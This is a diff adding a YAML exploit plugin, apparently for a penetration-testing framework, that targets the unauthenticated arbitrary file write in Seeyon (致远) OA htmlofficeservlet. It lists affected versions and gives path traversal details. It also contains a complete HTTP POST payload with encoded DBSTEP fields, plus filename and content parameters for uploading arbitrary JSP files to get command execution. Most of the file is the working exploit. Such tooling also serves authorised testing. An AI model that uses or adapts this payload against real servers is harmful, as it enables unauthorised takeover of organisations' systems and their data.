@@ -1,0 +1,55 @@
+info:
+    app: 致远OA
+    name: htmlofficeservlet
+    author: lz520520
+    plugin_version: 1.0.0
+    disclosure_date: "2019-06-26"
+    create_date: "2024-10-06 08:40:13"
+    update_date: "2024-10-06 08:40:13"
+    scope: |-
+        致远OA A8-V5 V6.1 SP1
+        致远OA A8+协同管理软件 V7.0
+        致远OA A8+协同管理软件 V7.0 SP1
+        致远OA A8+协同管理软件 V7.0 SP2
+        致远OA A8+协同管理软件 V7.0 SP3
+        致远OA A8+协同管理软件 V7.1
+    description: 致远 OA 系统的一些版本存在任意文件写入漏洞，远程攻击者在无需登录的情况下可通过向 URL /seeyon/htmlofficeservlet POST 精心构造的数据即可向目标服务器写入任意文件，写入成功后可执行任意系统命令进而控制目标服务器。
+    detail: |-
+        URL如http://192.168.111.111:8080/seeyon/htmlofficeservlet
+        上传jsp成功后，则无法再对相同jsp文件名覆盖上传。
+        上传内容要大于10bytes，否则上传会失败。
+        PS:路径实际上是这样拼接的 ../../../ApacheJetspeed/webapps/seeyon/test.jsp
+    payload: |-
+        POST /seeyon/htmlofficeservlet HTTP/1.1
+        Host: www.test.com
+        Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Connection: keep-alive
+        Content-Length: 429
+
+        DBSTEP V3.0     347             0               10             DBSTEP=OKMLlKlV
+        OPTION=S3WYOSWLBSGr
+        currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66
+        CREATEDATE=wUghPB3szB3Xwg66
+        RECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6
+        originalFileId=wV66
+        originalCreateDate=wUghPB3szB3Xwg66
+        FILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdN1liN7T3brV=
+        needReadFile=yRWZdAS6
+        originalCreateDate=wLSGP4oEzLKAz4=iz=66
+        a123456111111111111
+payloads:
+    - name: upload1
+      alias: 文件上传
+      params:
+          - key: filename
+            title: 文件名
+            param_type: edit
+            default_value: ""
+            required: true
+          - key: content
+            title: 内容
+            param_type: textarea
+            default_value: ""
+            required: true
